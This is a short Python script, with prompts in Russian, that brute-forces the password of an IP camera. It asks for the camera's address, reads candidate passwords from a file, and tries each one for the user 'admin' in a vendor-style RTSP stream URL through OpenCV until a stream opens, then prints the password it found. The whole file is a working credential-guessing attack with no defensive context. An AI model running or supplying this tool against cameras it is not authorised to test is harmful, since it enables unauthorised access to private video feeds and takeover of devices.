import cv2

ip = input("Введите IP камеры (например, 192.168.1.4): ").strip()
username = "admin"
passwords_file = "passwords.txt"

try:
    with open(passwords_file, "r") as f:
        passwords = f.read().splitlines()
except FileNotFoundError:
    print(f"[!] Файл {passwords_file} не найден.")
    exit(1)

for password in passwords:
    rtsp_url = f"rtsp://{ip}/user={username}_password={password}_channel=1_stream=0.sdp?real_stream"
    print(f"[~] Пробую: {password}")
    cap = cv2.VideoCapture(rtsp_url)
    if cap.isOpened():
        print(f"\n[+] УСПЕХ! Пароль найден: {password}")
        break
    cap.release()
else:
    print("\n[-] Не удалось найти рабочий пароль.")
